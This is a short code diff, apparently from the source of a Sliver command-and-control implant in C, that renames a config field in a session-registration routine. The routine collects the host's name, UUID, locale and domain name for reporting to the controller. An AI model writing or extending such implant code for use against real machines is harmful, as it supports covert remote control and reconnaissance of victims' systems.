@@ -129,7 +129,7 @@ BOOL SessionRegister
 	GetSystemDefaultLocaleName(wszLocale, _countof(wszLocale));
 	lpLocaleName = ConvertWcharToChar(wszLocale);
 
-	ElementList[0] = CreateBytesElement(pSession->pGlobalConfig->szSliverName, lstrlenA(pSession->pGlobalConfig->szSliverName), 1);
+	ElementList[0] = CreateBytesElement(pSession->pGlobalConfig->lpSliverName, lstrlenA(pSession->pGlobalConfig->lpSliverName), 1);
 	ElementList[1] = CreateBytesElement(lpHostName, lstrlenA(lpHostName), 2);
 	ElementList[2] = CreateBytesElement(lpUUID + 1, lstrlenA(lpUUID + 1), 3);
 	ElementList[3] = CreateBytesElement(lpFullQualifiedName, lstrlenA(lpFullQualifiedName), 4);
